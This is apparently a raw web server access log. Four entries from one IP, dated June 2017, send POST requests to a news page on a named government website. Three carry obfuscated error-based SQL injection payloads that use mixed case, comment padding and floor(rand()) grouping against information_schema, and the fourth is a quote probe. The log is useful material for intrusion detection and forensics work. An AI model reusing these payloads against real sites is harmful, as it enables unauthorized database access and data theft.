92.142.34.80 - - [19/Jun/2017:07:34:00 +0530] "POST /detail_news.php?id=3%22+or+1=(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+%221%22=%221 HTTP/1.1" 200 18397 "http://www.cdmindia.gov.in/detail_news.php?id=3\"+or+1=(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)+and+\"1\"=\"1" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
92.142.34.80 - - [19/Jun/2017:07:34:01 +0530] "POST /detail_news.php?id=3'+or+1=(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)-- HTTP/1.1" 200 11727 "http://www.cdmindia.gov.in/detail_news.php?id=3'+or+1=(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)--" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
92.142.34.80 - - [19/Jun/2017:07:34:01 +0530] "POST /detail_news.php?id=3%22+or+1=(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)-- HTTP/1.1" 200 18397 "http://www.cdmindia.gov.in/detail_news.php?id=3\"+or+1=(%2f**%2fsElEcT+1+%2f**%2ffRoM(%2f**%2fsElEcT+count(*),%2f**%2fcOnCaT((%2f**%2fsElEcT(%2f**%2fsElEcT+%2f**%2fuNhEx(%2f**%2fhEx(%2f**%2fcOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21))))+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2flImIt+0,1),floor(rand(0)*2))x+%2f**%2ffRoM+information_schema.%2f**%2ftAbLeS+%2f**%2fgRoUp%2f**%2fbY+x)a)--" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
92.142.34.80 - - [19/Jun/2017:07:34:02 +0530] "POST /detail_news.php?id='0=A HTTP/1.1" 200 11730 "http://www.cdmindia.gov.in/detail_news.php?id='0=A" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
